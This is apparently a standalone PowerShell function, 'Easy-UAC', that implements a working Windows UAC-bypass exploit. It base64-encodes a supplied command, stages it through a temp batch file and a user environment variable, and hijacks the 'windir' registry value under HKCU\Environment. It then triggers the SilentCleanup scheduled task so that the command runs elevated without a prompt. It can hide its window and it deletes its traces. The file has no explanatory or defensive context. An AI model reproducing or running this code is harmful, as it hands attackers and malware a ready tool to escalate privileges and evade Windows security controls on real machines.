function Easy-UAC {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true, Position = 0)]
		[ValidateNotNullOrEmpty()]
		[string]
		$Command,
		[Parameter(Mandatory = $false, Position = 1)]
		[switch]
		$Hidden,
		[Parameter(Mandatory = $false, Position = 2)]
		[switch]
		$NoExitHost,
		[Parameter(Mandatory = $false, Position = 3)]
		[switch]
		$NoExitChild,
		[Parameter(Mandatory = $false, Position = 4)]
		[Int64]
		$SleepDuration = 2
	)
	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "-WindowStyle Hidden"} else {$hide = ""}
	if ($NoExitChild) {$end = "pause"} else {$end = "Exit;Exit;Exit"}
	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
	$Path = $env:TEMP + '\A.bat'
	$Value = "powershell $hide -c Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', `$null,[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User)
	New-Item -Path $Path -Value '%A%'
	New-ItemProperty 'HKCU:\Environment' -Name 'windir' -Value 'cmd.exe /k cmd.exe' -PropertyType String -Force
	powershell.exe -Command "schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
	[System.Environment]::SetEnvironmentVariable('A', $null,[System.EnvironmentVariableTarget]::User)
	Remove-Item $Path
	if (!$NoExitHost) {Exit;Exit;Exit}
}